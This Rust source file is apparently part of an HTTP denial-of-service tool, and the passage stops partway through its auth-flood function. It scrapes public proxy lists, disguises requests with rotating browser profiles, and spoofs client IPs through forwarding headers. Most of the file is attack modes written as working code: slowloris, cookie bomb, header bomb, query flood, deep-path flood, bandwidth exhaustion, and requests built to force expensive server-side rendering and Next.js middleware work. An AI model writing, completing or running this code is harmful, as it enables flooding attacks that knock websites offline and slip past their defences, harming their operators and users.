use crate::types::*;
use rand::prelude::*;
use rand::RngExt;
use regex::Regex;
use reqwest::{Client, RequestBuilder};
use reqwest::header::{HeaderMap, HeaderValue, SET_COOKIE, COOKIE, CONTENT_TYPE, USER_AGENT, HOST};
use scraper::{Html, Selector};
use std::collections::HashMap;
use std::sync::Arc;
use std::sync::atomic::{AtomicBool, AtomicUsize, Ordering};
use std::time::{Duration, Instant, SystemTime, UNIX_EPOCH};
use tokio::sync::{Mutex, Semaphore};
use tokio::time::{sleep, timeout};

pub(crate) async fn clone_request_builder_with_retry(
    builder: &RequestBuilder,
    name: &str,
) -> Result<RequestBuilder, FetchError> {
    for attempt in 0..=2 {
        if let Some(cloned) = builder.try_clone() {
            return Ok(cloned);
        }
        eprintln!("[WARN] {name}: builder.try_clone() returned None (attempt {attempt})");
        if attempt < 2 {
            tokio::time::sleep(Duration::from_millis(500 * (1u64 << attempt))).await;
        }
    }
    Err(FetchError::from(std::io::Error::other(format!(
        "{name}: builder.try_clone() returned None on final retry"
    ))))
}
pub(crate) async fn send_with_retry(
    builder: RequestBuilder,
    max_retries: usize,
    name: &str,
) -> Result<reqwest::Response, FetchError> {
    let mut last_err: Option<FetchError> = None;
    for attempt in 0..=max_retries {
        let cloned = clone_request_builder_with_retry(&builder, name).await?;
        match cloned.send().await {
            Ok(resp) => {
                let status = resp.status();
                if status.is_server_error() && attempt < max_retries {
                    last_err = Some(FetchError::from(std::io::Error::other(format!(
                        "{name}: server error {status}"
                    ))));
                    let backoff = Duration::from_millis(500 * (1u64 << attempt)).min(Duration::from_secs(8));
                    tokio::time::sleep(backoff).await;
                    continue;
                }
                return Ok(resp);
            }
            Err(e) => {
                if (e.is_timeout() || e.is_connect()) && attempt < max_retries {
                    last_err = Some(FetchError::from(e));
                    let backoff = Duration::from_millis(500 * (1u64 << attempt)).min(Duration::from_secs(8));
                    tokio::time::sleep(backoff).await;
                    continue;
                }
                return Err(FetchError::from(e));
            }
        }
    }
    Err(match last_err {
        Some(err) => err,
        None => FetchError::from(std::io::Error::other(format!(
            "{name}: all retries exhausted"
        ))),
    })
}
pub(crate) static SPOOF_IP: AtomicBool = AtomicBool::new(false);
pub(crate) static CUSTOM_POST_BODY: std::sync::OnceLock<String> = std::sync::OnceLock::new();
pub(crate) static CUSTOM_CONTENT_TYPE: std::sync::OnceLock<String> = std::sync::OnceLock::new();
pub(crate) fn random_ip() -> String {
    let mut rng = rand::rng();
    format!(
        "{}.{}.{}.{}",
        rng.random_range(1..255),
        rng.random_range(0..255),
        rng.random_range(0..255),
        rng.random_range(1..255)
    )
}
pub(crate) const BROWSER_PROFILES: &[BrowserProfile] = &[
    BrowserProfile { ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36", sec_ch_ua: Some("\"Google Chrome\";v=\"125\", \"Chromium\";v=\"125\", \"Not.A/Brand\";v=\"24\""), platform: Some("\"Windows\""), mobile: "?0" },
    BrowserProfile { ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36", sec_ch_ua: Some("\"Chromium\";v=\"124\", \"Google Chrome\";v=\"124\", \"Not-A.Brand\";v=\"99\""), platform: Some("\"Windows\""), mobile: "?0" },
    BrowserProfile { ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0", sec_ch_ua: None, platform: None, mobile: "?0" },
    BrowserProfile { ua: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36", sec_ch_ua: Some("\"Google Chrome\";v=\"125\", \"Chromium\";v=\"125\", \"Not.A/Brand\";v=\"24\""), platform: Some("\"macOS\""), mobile: "?0" },
    BrowserProfile { ua: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Version/17.5 Safari/605.1.15", sec_ch_ua: None, platform: None, mobile: "?0" },
    BrowserProfile { ua: "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36", sec_ch_ua: Some("\"Google Chrome\";v=\"125\", \"Chromium\";v=\"125\", \"Not.A/Brand\";v=\"24\""), platform: Some("\"Linux\""), mobile: "?0" },
    BrowserProfile { ua: "Mozilla/5.0 (X11; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0", sec_ch_ua: None, platform: None, mobile: "?0" },
    BrowserProfile { ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0", sec_ch_ua: Some("\"Microsoft Edge\";v=\"125\", \"Chromium\";v=\"125\", \"Not-A.Brand\";v=\"24\""), platform: Some("\"Windows\""), mobile: "?0" },
    BrowserProfile { ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 OPR/109.0.0.0", sec_ch_ua: Some("\"Opera\";v=\"109\", \"Chromium\";v=\"124\", \"Not-A.Brand\";v=\"99\""), platform: Some("\"Windows\""), mobile: "?0" },
    BrowserProfile { ua: "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1", sec_ch_ua: None, platform: None, mobile: "?1" },
];
impl BrowserHeaders {
    fn random() -> Self {
        let mut rng = rand::rng();
        let profile = &BROWSER_PROFILES[rng.random_range(0..BROWSER_PROFILES.len())];
        let mut headers = [("", ""); 15];
        headers[0] = ("User-Agent", profile.ua);
        headers[1] = ("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8");
        headers[2] = ("Accept-Language", if rng.random_bool(0.33) { "en-GB,en;q=0.9" } else { "en-US,en;q=0.9" });
        headers[3] = ("Accept-Encoding", "gzip, deflate, br");
        headers[4] = ("Cache-Control", "no-cache");
        headers[5] = ("Pragma", "no-cache");
        headers[6] = ("Upgrade-Insecure-Requests", "1");
        headers[7] = ("Sec-Fetch-Dest", "document");
        headers[8] = ("Sec-Fetch-Mode", "navigate");
        headers[9] = ("Sec-Fetch-Site", "none");
        headers[10] = ("Sec-Fetch-User", "?1");
        headers[11] = ("Connection", "keep-alive");
        
        let mut len = 12;
        if let Some(v) = profile.sec_ch_ua {
            headers[len] = ("Sec-CH-UA", v);
            len += 1;
        }
        if let Some(v) = profile.platform {
            headers[len] = ("Sec-CH-UA-Platform", v);
            len += 1;
        }
        headers[len] = ("Sec-CH-UA-Mobile", profile.mobile);
        len += 1;
        
        for i in (1..len).rev() {
            headers.swap(i, rng.random_range(0..i + 1));
        }
        BrowserHeaders { headers, len }
    }
    fn apply(&self, mut builder: RequestBuilder) -> RequestBuilder {
        for i in 0..self.len {
            let (name, value) = self.headers[i];
            builder = builder.header(name, value);
        }
        builder
    }
}
pub(crate) fn browser_request(builder: RequestBuilder, _spoof_ip: bool) -> RequestBuilder {
    let builder = BrowserHeaders::random().apply(builder);
    if _spoof_ip || SPOOF_IP.load(Ordering::Relaxed) {
        let ip = random_ip();
        builder
            .header("X-Forwarded-For", &ip)
            .header("X-Real-IP", &ip)
            .header("CF-Connecting-IP", &ip)
            .header("True-Client-IP", &ip)
    } else {
        builder
    }
}
pub(crate) fn add_session_cookie(mut builder: RequestBuilder, proxy_idx: usize, sessions: &[std::sync::Mutex<String>]) -> RequestBuilder {
    if proxy_idx < sessions.len() {
        let cookie = match sessions[proxy_idx].lock() {
            Ok(guard) => guard.clone(),
            Err(e) => {
                eprintln!("  Session lock poisoned: {}", e);
                String::new()
            }
        };
        if !cookie.is_empty() { builder = builder.header("Cookie", cookie); }
    }
    builder
}
pub(crate) fn add_session_and_extra_cookie(mut builder: RequestBuilder, proxy_idx: usize, sessions: &[std::sync::Mutex<String>], extra_cookie: &str) -> RequestBuilder {
    if proxy_idx < sessions.len() {
        let stored = match sessions[proxy_idx].lock() {
            Ok(guard) => guard.clone(),
            Err(e) => {
                eprintln!("  Session lock poisoned: {}", e);
                String::new()
            }
        };
        let cookie = if stored.is_empty() { extra_cookie.to_string() } else { format!("{}; {}", stored, extra_cookie) };
        builder = builder.header("Cookie", cookie);
    } else {
        builder = builder.header("Cookie", extra_cookie);
    }
    builder
}
pub(crate) fn extract_set_cookie(headers: &HeaderMap) -> Option<String> {
    let cookies: Vec<String> = headers
        .get_all(SET_COOKIE)
        .iter()
        .filter_map(|v| v.to_str().ok())
        .filter_map(|v| v.split(';').next())
        .filter_map(|v| { let trimmed = v.trim(); if !trimmed.is_empty() { Some(trimmed.to_string()) } else { None }})
        .collect();
    if cookies.is_empty() { None } else { Some(cookies.join("; ")) }
}
pub(crate) fn update_session_from_headers(proxy_idx: usize, sessions: &[std::sync::Mutex<String>], headers: &HeaderMap) {
    if proxy_idx < sessions.len() {
        if let Some(cookie) = extract_set_cookie(headers) {
            if let Ok(mut session) = sessions[proxy_idx].lock() {
                *session = cookie;
            } else {
                eprintln!("  Session lock poisoned");
            }
        }
    }
}
pub(crate) fn browser_client_builder(config: &ClientConfig) -> reqwest::ClientBuilder {
    let mut builder = Client::builder()
        .timeout(config.timeout)
        .pool_max_idle_per_host(config.pool_max_idle)
        .pool_idle_timeout(config.pool_idle_timeout)
        .tcp_nodelay(true)
        .danger_accept_invalid_certs(config.insecure)
        .danger_accept_invalid_hostnames(config.insecure);

    if let Some((ref host, ip)) = config.pinned_dns {
        builder = builder.resolve_to_addrs(host, &[
            std::net::SocketAddr::new(ip, 80),
            std::net::SocketAddr::new(ip, 443),
        ]);
    }

    // Build default headers map, merging custom headers with SNI Host override
    let mut hdrs = reqwest::header::HeaderMap::new();
    for (name, value) in &config.custom_headers {
        if let (Ok(hn), Ok(hv)) = (
            reqwest::header::HeaderName::from_bytes(name.as_bytes()),
            reqwest::header::HeaderValue::from_str(value),
        ) {
            hdrs.insert(hn, hv);
        }
    }
    if let Some(ref sni) = config.sni {
        if let Ok(host_val) = reqwest::header::HeaderValue::from_str(sni) {
            hdrs.insert(reqwest::header::HOST, host_val);
        }
    }
    if !hdrs.is_empty() {
        builder = builder.default_headers(hdrs);
    }
    match &config.custom_user_agent {
        Some(ua) => builder = builder.user_agent(ua.as_str()),
        None => {
            // if no custom UA, don't set one — reqwest uses a default
        }
    }
    builder
}
pub(crate) fn detect_scheme(url: &str) -> &'static str {
    let url_lower = url.to_lowercase();
    if url_lower.contains("socks5") {
        "socks5"
    } else if url_lower.contains("socks4") {
        "socks4"
    } else if url_lower.contains("socks") {
        "socks5"
    } else {
        "http"
    }
}
pub(crate) async fn scrape_html(c: &Client, url: &str, custom_selector: Option<&str>) -> Vec<String> {
    use std::sync::OnceLock;
    static RE_IP_PORT: OnceLock<Regex> = OnceLock::new();
    static SEL_TR: OnceLock<Selector> = OnceLock::new();
    static SEL_TD: OnceLock<Selector> = OnceLock::new();

    let scheme = detect_scheme(url);
    let r = match tokio::time::timeout(Duration::from_secs(8), browser_request(c.get(url), false).send()).await { Ok(Ok(r)) => r, _ => return vec![] };
    let h = match tokio::time::timeout(Duration::from_secs(8), r.text()).await { Ok(Ok(t)) => t, _ => return vec![] };
    let doc = Html::parse_document(&h);
    let mut out = vec![];
    if let Some(sel_str) = custom_selector {
        if let Ok(s) = Selector::parse(sel_str) {
            let re = RE_IP_PORT.get_or_init(|| {
                Regex::new(r"(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}):(\d+)").unwrap_or_else(|_| {
                    // The literal regex is valid; if it somehow fails, use a regex that
                    // matches nothing instead of panicking.
                    #[allow(clippy::unwrap_used)]
                    Regex::new("$^").unwrap()
                })
            });
            for el in doc.select(&s) {
                let text = el.text().collect::<String>();
                for cap in re.captures_iter(&text) {
                    if cap.len() >= 3 {
                        out.push(format!("{}://{}:{}", scheme, &cap[1], &cap[2]));
                    }
                }
            }
        }
    } else {
        let tr = SEL_TR.get_or_init(|| {
            Selector::parse("table.table tbody tr").unwrap_or_else(|_| {
                // The literal selector is valid; if it somehow fails, use a selector
                // that matches nothing instead of panicking.
                #[allow(clippy::unwrap_used)]
                Selector::parse("#__simulate_load_never__").unwrap()
            })
        });
        let td = SEL_TD.get_or_init(|| {
            Selector::parse("td").unwrap_or_else(|_| {
                #[allow(clippy::unwrap_used)]
                Selector::parse("#__simulate_load_never__").unwrap()
            })
        });
        for row in doc.select(tr) {
            let cells: Vec<String> = row.select(td).map(|c| c.text().collect::<String>().trim().to_string()).collect();
            if cells.len() >= 2 {
                let ip = cells[0].trim().to_string();
                let port = cells[1].trim().to_string();
                if !ip.is_empty() && !port.is_empty() {
                    out.push(format!("{}://{}:{}", scheme, ip, port));
                }
            }
        }
    }
    out
}
pub(crate) async fn scrape_raw(c: &Client, url: &str, re: &Regex) -> Vec<String> {
    let scheme = detect_scheme(url);
    let r = match tokio::time::timeout(Duration::from_secs(8), browser_request(c.get(url), false).send()).await { Ok(Ok(r)) => r, _ => return vec![] };
    let t = match tokio::time::timeout(Duration::from_secs(8), r.text()).await { Ok(Ok(t)) => t, _ => return vec![] };
    t.lines().filter_map(|l| { let x = l.trim(); if x.is_empty() || x.starts_with('#') || x.starts_with("//") { return None; } re.captures(x).and_then(|c| c.get(1).map(|m| m.as_str().to_string())).map(|ip_port| format!("{}://{}", scheme, ip_port)) }).collect()
}
pub(crate) async fn scrape_all(c: &Client, state: &Arc<Mutex<AppState>>) -> Vec<String> {
    let (max, custom_selector) = {
        let st = state.lock().await;
        (st.max_scrape, st.custom_selector.clone())
    };
    let re = Arc::new(Regex::new(r"(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d+)").unwrap_or_else(|_| {
        // The literal regex is valid; if it somehow fails, use a regex that
        // matches nothing instead of panicking.
        #[allow(clippy::unwrap_used)]
        Regex::new("$^").unwrap()
    }));
    let all = Arc::new(Mutex::new(Vec::new()));
    let sem = Arc::new(Semaphore::new(10));
    let done = Arc::new(AtomicBool::new(false));
    let ht = HTML_SRC.len() as u32;
    let rt = RAW_SRC.len() as u32;
    let total = ht + rt;
    state.lock().await.scrape_total = total;
    let mut handles = vec![];
    let srcs: Vec<(&str, bool)> = HTML_SRC.iter().map(|s| (*s, true)).chain(RAW_SRC.iter().map(|s| (*s, false))).collect();
    for (idx, (src, html)) in srcs.into_iter().enumerate() {
        let s2 = state.clone();
        let a2 = all.clone();
        let r2 = re.clone();
        let c2 = c.clone();
        let s_ = src.to_string();
        let maxed = done.clone();
        let h = html;
        let sel = custom_selector.clone();
        let sem = sem.clone();
        handles.push(tokio::spawn(async move {
            let _permit = match sem.acquire_owned().await { Ok(p) => p, Err(_) => return, };
            if maxed.load(Ordering::Relaxed) { return; }
            {
                let mut st = s2.lock().await;
                st.scrape_phase = (idx + 1) as u32;
                st.status_msg = format!("Scraping {} [{}/{}]...", if h {"HTML"} else {"raw"}, idx + 1, total);
            }
            let p2 = if h { scrape_html(&c2, &s_, sel.as_deref()).await } else { scrape_raw(&c2, &s_, &r2).await };
            let mut a = a2.lock().await;
            a.extend(p2);
            if a.len() >= max {
                maxed.store(true, Ordering::Relaxed);
            }
        }));
    }
    for h in handles { let _ = h.await; }
    let mut r = all.lock().await.clone(); r.sort(); r.dedup(); r.truncate(max);
    state.lock().await.total_scraped = r.len(); state.lock().await.status_msg = format!("Scraped {} unique proxies", r.len()); r
}
pub(crate) async fn tcp_check(addr: &str, timeout: u64) -> bool {
    use std::net::SocketAddr;
    let a = addr.trim_start_matches("http://").trim_start_matches("https://").trim_start_matches("socks4://").trim_start_matches("socks5://").trim_start_matches("socks://");
    if let Ok(socket_addr) = a.parse::<SocketAddr>() {
        tokio::time::timeout(Duration::from_secs(timeout), tokio::net::TcpStream::connect(socket_addr)).await.ok().and_then(|r| r.ok()).is_some()
    } else {
        tokio::time::timeout(Duration::from_secs(timeout), tokio::net::TcpStream::connect(a)).await.ok().and_then(|r| r.ok()).is_some()
    }
}
pub(crate) fn parse_templates(body: &str) -> String {
    let mut result = body.to_string();
    if result.contains("{{random_uuid}}") {
        let uuid = format!("{:08x}-{:04x}-4{:03x}-{:04x}-{:012x}",
            rand::random::<u32>(),
            rand::random::<u16>(),
            rand::random::<u16>() & 0x0fff,
            rand::random::<u16>() & 0x3fff | 0x8000,
            rand::random::<u64>() >> 16
        );
        result = result.replace("{{random_uuid}}", &uuid);
    }
    if result.contains("{{timestamp}}") {
        if let Ok(dur) = std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH) {
            result = result.replace("{{timestamp}}", &dur.as_secs().to_string());
        }
    }
    if result.contains("{{random_int}}") {
        let num = rand::random::<u32>() % 100000;
        result = result.replace("{{random_int}}", &num.to_string());
    }
    result
}
pub(crate) async fn fetch_page(c: Client, url: String, delay: u64, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>, verbose: bool, max_retries: usize) -> Result<(usize, u16), FetchError> {
    if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
    if verbose {
        println!("[VERBOSE] fetch_page: GET {}", url);
    }
    let builder = add_session_cookie(browser_request(c.get(&url), false), proxy_idx, &sessions);
    let resp = send_with_retry(builder, max_retries, "fetch_page").await?;
    let status = resp.status().as_u16();
    update_session_from_headers(proxy_idx, &sessions, resp.headers());
    let bytes = resp.bytes().await?.len();
    Ok((bytes, status))
}

#[allow(clippy::too_many_arguments)]
pub(crate) async fn fetch_page_with_referrer(
    c: Client,
    url: String,
    referrer: Option<String>,
    delay: u64,
    proxy_idx: usize,
    sessions: Arc<Vec<std::sync::Mutex<String>>>,
    verbose: bool,
    max_retries: usize,
) -> Result<(usize, u16), FetchError> {
    if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
    if verbose {
        println!("[VERBOSE] fetch_page_with_referrer: GET {} (referrer: {:?}) (proxy #{})", url, referrer, proxy_idx);
    }
    let mut builder = browser_request(c.get(&url), false);
    if let Some(ref ref_val) = referrer {
        builder = builder.header("Referer", ref_val);
    }
    let builder = add_session_cookie(builder, proxy_idx, &sessions);
    let resp = send_with_retry(builder, max_retries, "fetch_page_with_referrer").await?;
    let status = resp.status().as_u16();
    update_session_from_headers(proxy_idx, &sessions, resp.headers());
    let bytes = resp.bytes().await?.len();
    Ok((bytes, status))
}

pub(crate) async fn fetch_range(c: Client, url: String, delay: u64, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>, verbose: bool, max_retries: usize) -> Result<(usize, u16), FetchError> {
    if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
    let end = 100 + (rand::rng().random_range(0..9000));
    if verbose {
        println!("[VERBOSE] fetch_range: GET {} range=bytes=0-{} (proxy #{})", url, end, proxy_idx);
    }
    let builder = browser_request(c.get(&url), false).header("Range", format!("bytes=0-{}", end))
        .header("Accept", "*/*").header("Cache-Control", "no-cache");
    let builder = add_session_cookie(builder, proxy_idx, &sessions);
    let resp = send_with_retry(builder, max_retries, "fetch_range").await?;
    let status = resp.status().as_u16();
    update_session_from_headers(proxy_idx, &sessions, resp.headers());
    let bytes = resp.bytes().await?.len();
    Ok((bytes, status))
}

pub(crate) async fn fetch_slow(c: Client, url: String, delay: u64, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>, verbose: bool, max_retries: usize) -> Result<(usize, u16), FetchError> {
    if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
    if verbose {
        println!("[VERBOSE] fetch_slow: GET {} (proxy #{}), streaming", url, proxy_idx);
    }
    let builder = browser_request(c.get(&url), false).header("Accept", "*/*").header("Cache-Control", "no-cache");
    let builder = add_session_cookie(builder, proxy_idx, &sessions);
    let resp = send_with_retry(builder, max_retries, "fetch_slow").await?;
    let status = resp.status().as_u16();
    update_session_from_headers(proxy_idx, &sessions, resp.headers());
    let mut total = 0usize;
    let mut stream = resp.bytes_stream();
    use tokio_stream::StreamExt;
    while let Some(chunk) = stream.next().await {
        if let Ok(c) = &chunk { total += c.len(); }
        tokio::time::sleep(Duration::from_millis(100)).await;
    }
    Ok((total, status))
}

pub(crate) async fn fetch_post(c: Client, url: String, delay: u64, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>, verbose: bool, max_retries: usize) -> Result<(usize, u16), FetchError> {
    if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
    if verbose {
        println!("[VERBOSE] fetch_post: POST {} (proxy #{})", url, proxy_idx);
    }
    let raw_body = CUSTOM_POST_BODY.get().cloned().unwrap_or_else(|| "{\"id\":\"{{random_uuid}}\", \"timestamp\": {{timestamp}}, \"value\": {{random_int}}, \"data\":\"xxxxxxxxxx\"}".to_string());
    let body = parse_templates(&raw_body);
    let content_type = CUSTOM_CONTENT_TYPE.get().map(|s| s.as_str()).unwrap_or("application/json");
    let builder = browser_request(c.post(&url), false).header("Content-Type", content_type)
        .header("Cache-Control", "no-cache").body(body);
    let builder = add_session_cookie(builder, proxy_idx, &sessions);
    let resp = send_with_retry(builder, max_retries, "fetch_post").await?;
    let status = resp.status().as_u16();
    update_session_from_headers(proxy_idx, &sessions, resp.headers());
    let bytes = resp.bytes().await?.len();
    Ok((bytes, status))
}

pub(crate) async fn fetch_cookie(c: Client, url: String, delay: u64, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>, verbose: bool, max_retries: usize) -> Result<(usize, u16), FetchError> {
    if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
    if verbose {
        println!("[VERBOSE] fetch_cookie: GET {} with cookie bomb (8KB payload) (proxy #{})", url, proxy_idx);
    }
    let bomb_payload = "x".repeat(8192);
    let cookie = format!("_ga={}; _gid={}; session={}; bomb={}",
        rand::random::<u64>(), rand::random::<u64>(), rand::random::<u64>(), bomb_payload);
    let builder = browser_request(c.get(&url), false).header("Accept", "*/*").header("Cache-Control", "no-cache");
    let builder = add_session_and_extra_cookie(builder, proxy_idx, &sessions, &cookie);
    let resp = send_with_retry(builder, max_retries, "fetch_cookie").await?;
    let status = resp.status().as_u16();
    update_session_from_headers(proxy_idx, &sessions, resp.headers());
    let bytes = resp.bytes().await?.len();
    Ok((bytes, status))
}

pub(crate) async fn fetch_slowloris(c: Client, url: String, delay: u64, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>, verbose: bool, max_retries: usize) -> Result<(usize, u16), FetchError> {
    if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
    if verbose {
        println!("[VERBOSE] fetch_slowloris: POST {} slowloris attack (proxy #{})", url, proxy_idx);
    }
    use tokio_stream::StreamExt;
    let stream = tokio_stream::wrappers::IntervalStream::new(tokio::time::interval(Duration::from_secs(3)))
        .take(10)
        .map(|_| Ok::<_, std::io::Error>(bytes::Bytes::from("a")));
    let body = reqwest::Body::wrap_stream(stream);
    let builder = browser_request(c.post(&url), false)
        .header("Content-Type", "application/octet-stream")
        .header("Content-Length", "10")
        .header("Cache-Control", "no-cache")
        .body(body);
    let builder = add_session_cookie(builder, proxy_idx, &sessions);
    let resp = send_with_retry(builder, max_retries, "fetch_slowloris").await?;
    let status = resp.status().as_u16();
    update_session_from_headers(proxy_idx, &sessions, resp.headers());
    let bytes = resp.bytes().await?.len();
    Ok((bytes, status))
}

/// Bandwidth mode: request a large range from the server to actually
/// consume downstream bandwidth. Uses a `Range: bytes=0-99999999` header
/// to ask for a large chunk; many servers return 206 Partial Content.
pub(crate) async fn fetch_bandwidth(c: Client, url: String, delay: u64, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>, verbose: bool, max_retries: usize) -> Result<(usize, u16), FetchError> {
    if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
    if verbose {
        println!("[VERBOSE] fetch_bandwidth: GET {} with Range header (proxy #{})", url, proxy_idx);
    }
    let builder = add_session_cookie(browser_request(c.get(&url), false), proxy_idx, &sessions);
    let builder = builder.header(reqwest::header::RANGE, "bytes=0-99999999");
    let resp = send_with_retry(builder, max_retries, "fetch_bandwidth").await?;
    let status = resp.status().as_u16();
    update_session_from_headers(proxy_idx, &sessions, resp.headers());
    // Read the full body to actually consume bandwidth
    let bytes = resp.bytes().await?.len();
    if verbose {
        println!("  [BANDWIDTH] Got {} bytes (HTTP {})", bytes, status);
    }
    Ok((bytes, status))
}

/// SSR mode: force server-side rendering by requesting the React Server
/// Components (RSC) payload. Real Next.js/Vercel targets render HTML on the
/// server for these requests; without the `?_rsc` + `text/x-component` Accept
/// the request would just be a static page GET (identical to Normal).
pub(crate) async fn fetch_ssr(c: Client, url: String, delay: u64, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>, verbose: bool, max_retries: usize) -> Result<(usize, u16), FetchError> {
    if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
    let sep = if url.contains('?') { '&' } else { '?' };
    let rsc = format!("{}{}_rsc={:x}", url, sep, rand::random::<u32>());
    if verbose {
        println!("[VERBOSE] fetch_ssr: GET {} (Accept: text/x-component) (proxy #{})", rsc, proxy_idx);
    }
    let builder = browser_request(c.get(&rsc), false)
        .header("Accept", "text/x-component")
        .header("Cache-Control", "no-cache");
    let builder = add_session_cookie(builder, proxy_idx, &sessions);
    let resp = send_with_retry(builder, max_retries, "fetch_ssr").await?;
    let status = resp.status().as_u16();
    update_session_from_headers(proxy_idx, &sessions, resp.headers());
    let bytes = resp.bytes().await?.len();
    Ok((bytes, status))
}

/// Middleware mode: exercise the Next.js edge middleware interception path.
/// Middleware runs on every request to the root; sending the
/// `x-middleware-subrequest` header (which Next.js itself uses to prevent
/// middleware recursion) makes the request actually traverse the middleware
/// layer rather than resolving to a cached static asset.
pub(crate) async fn fetch_middleware(c: Client, url: String, delay: u64, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>, verbose: bool, max_retries: usize) -> Result<(usize, u16), FetchError> {
    if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
    if verbose {
        println!("[VERBOSE] fetch_middleware: GET {} (x-middleware-subrequest) (proxy #{})", url, proxy_idx);
    }
    let builder = browser_request(c.get(&url), false)
        .header("x-middleware-subrequest", "pages/_app")
        .header("Cache-Control", "no-cache");
    let builder = add_session_cookie(builder, proxy_idx, &sessions);
    let resp = send_with_retry(builder, max_retries, "fetch_middleware").await?;
    let status = resp.status().as_u16();
    update_session_from_headers(proxy_idx, &sessions, resp.headers());
    let bytes = resp.bytes().await?.len();
    Ok((bytes, status))
}

pub(crate) async fn fetch_headerbomb(c: Client, url: String, delay: u64, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>, verbose: bool, max_retries: usize) -> Result<(usize, u16), FetchError> {
    if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
    let mut builder = c.get(&url);
    for i in 0..120 {
        builder = builder.header(format!("X-Custom-Header-{}", i), format!("header-value-{}-with-random-data-{:08x}", i, rand::random::<u32>()));
    }
    if verbose { println!("[VERBOSE] fetch_headerbomb: GET {} (proxy #{}) — 120 custom headers", url, proxy_idx); }
    let resp = send_with_retry(builder.header("User-Agent", "Mozilla/5.0 (compatible; HeaderBomb/1.0)"), max_retries, "fetch_headerbomb").await?;
    let status = resp.status().as_u16();
    update_session_from_headers(proxy_idx, &sessions, resp.headers());
    let bytes = resp.bytes().await?.len();
    Ok((bytes, status))
}

pub(crate) async fn fetch_queryflood(c: Client, url: String, delay: u64, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>, verbose: bool, max_retries: usize) -> Result<(usize, u16), FetchError> {
    if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
    let mut query_pairs: Vec<String> = (0..120).map(|i| format!("param{}=value{:08x}", i, rand::random::<u32>())).collect();
    query_pairs.push(format!("_={}", std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).unwrap_or_default().as_nanos()));
    let qs = query_pairs.join("&");
    let target = format!("{}?{}", url.trim_end_matches('?'), qs);
    if verbose { println!("[VERBOSE] fetch_queryflood: GET {} (proxy #{}) — {} query params", url, proxy_idx, query_pairs.len()); }
    let resp = send_with_retry(c.get(&target).header("User-Agent", "Mozilla/5.0 (compatible; QueryFlood/1.0)"), max_retries, "fetch_queryflood").await?;
    let status = resp.status().as_u16();
    update_session_from_headers(proxy_idx, &sessions, resp.headers());
    let bytes = resp.bytes().await?.len();
    Ok((bytes, status))
}

pub(crate) async fn fetch_deeppath(c: Client, url: String, delay: u64, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>, verbose: bool, max_retries: usize) -> Result<(usize, u16), FetchError> {
    if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
    let path: String = { (0..20).map(|_| format!("{:08x}", rand::random::<u32>())).collect::<Vec<_>>().join("/") };
    let target = format!("{}{}", url.trim_end_matches('/'), path);
    if verbose { println!("[VERBOSE] fetch_deeppath: GET {} (proxy #{}) — 20-segment path", target, proxy_idx); }
    let resp = send_with_retry(c.get(&target).header("User-Agent", "Mozilla/5.0 (compatible; DeepPath/1.0)"), max_retries, "fetch_deeppath").await?;
    let status = resp.status().as_u16();
    update_session_from_headers(proxy_idx, &sessions, resp.headers());
    let bytes = resp.bytes().await?.len();
    Ok((bytes, status))
}

pub(crate) async fn fetch_authflood(c: Client, url: String, delay: u64, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>, verbose: bool, max_retries: usize) -> Result<(usize, u16), FetchError> {
    if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
